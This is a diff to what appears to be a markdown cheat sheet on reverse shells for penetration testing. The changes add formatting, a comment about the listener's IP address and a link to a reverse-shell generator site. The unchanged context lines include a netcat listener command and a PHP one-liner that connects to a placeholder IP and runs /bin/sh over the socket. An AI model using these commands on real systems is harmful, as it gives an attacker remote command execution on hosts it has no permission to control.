@@ -416,8 +416,9 @@ sudo nc –lnvp {PORT}
 
 # {PORT}: Select the port used to listen
 ```
-
 <br />
+
+# {IP ADDRESS}: IP Address of the client from step one (python server)
 
 ## NC Execute - Server [STEP 2]
 
@@ -448,12 +449,16 @@ php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 
 # {IP ADDRESS}: IP Address of the client from step one (listener)
 # {PORT}: Port of the client from step one (listener)
 ```
+<br />
 
+## Reverse Shell Generator
+
+<br />
 
 [https://www.revshells.com/](https://www.revshells.com/)
 
 
-
+<br />
 
 # Shell Upgrade
 
